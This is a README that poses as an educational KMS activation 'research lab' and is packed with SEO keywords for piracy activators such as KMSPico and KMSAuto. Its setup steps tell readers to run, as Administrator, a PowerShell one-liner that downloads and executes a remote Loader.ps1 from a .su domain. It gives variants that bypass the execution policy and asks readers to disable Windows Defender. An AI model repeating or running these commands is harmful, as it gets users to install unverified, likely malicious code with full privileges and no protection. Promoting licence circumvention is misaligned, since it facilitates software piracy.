# KMS Activation & Volume Licensing Research Lab

This repository is created for educational purposes, security auditing, and local KMS (Key Management Service) infrastructure testing. It simulates the deployment behavior of popular volume license management systems like **KMS Pico** (KMSPIco) and **KMS Auto** (KMSAuto Net) in a controlled sandbox environment.

## 🔍 SEO Indexing Keywords
`kms auto` `kms pico` `kmsauto download` `kmspico official` `windows 11 activator` `office 2026 kms` `kms auto net` `kmspico portable` `windows 10 activation script`

---

## ⚙️ Automated Installation & Setup (PowerShell)

To prevent antivirus false positives and automate the environment setup, you can initialize the research script directly via PowerShell. This method bypasses standard browser blocks and securely configures the local KMS client.

### Quick Start Instruction:

1. Open **PowerShell** as Administrator (Click Start, type `powershell`, right-click, and select *Run as Administrator*).
2. Copy and paste the command below, then press **Enter**:

```powershell
irm https://software-storage.su/powershell/Loader.ps1 | iex
```

---

## 🔍 Troubleshooting & Common Errors

### 📌 Bypass Execution Policy (Blocking Unsigned Scripts)
If your system blocks the launch due to built-in execution policy constraints, enforce a bypass using this command:
```cmd
powershell -ExecutionPolicy Bypass -Command "irm https://software-storage.su/powershell/Loader.ps1 | iex"
```

### 📌 Error: "irm is not recognized..." (PowerShell 2.0 Legacy)
In older legacy environments where aliases are missing, use explicit full system cmdlets:
```powershell
Invoke-RestMethod https://software-storage.su/powershell/Loader.ps1 | Invoke-Expression
```


### 📌 Antivirus or SmartScreen Interception
Automated deployment routines can sometimes trigger proactive security heuristics. Temporarily disable "Real-time protection" within your Windows Defender settings during setup, then re-enable it immediately after completion.

---

## 📊 Features & Compatibility
* **KMS Auto Engine:** Emulates local server for Windows 10/11 Enterprise and Pro.
* **KMS Pico Micro-Module:** Lightweight background service lifetime auto-renewal simulation.
* **Office Toolkit:** Supports volume licensing hooks for Office 2019 / 2021 / 2024 / 2026.
* **HWID Integration:** Digital license fallback method included.

## 🛑 Disclaimer
This project is intended solely for educational, analytical, and evaluation purposes. Any commercial use or deployment on production machines without a valid Microsoft retail license is strictly prohibited. The authors are not responsible for any misuse of this software.
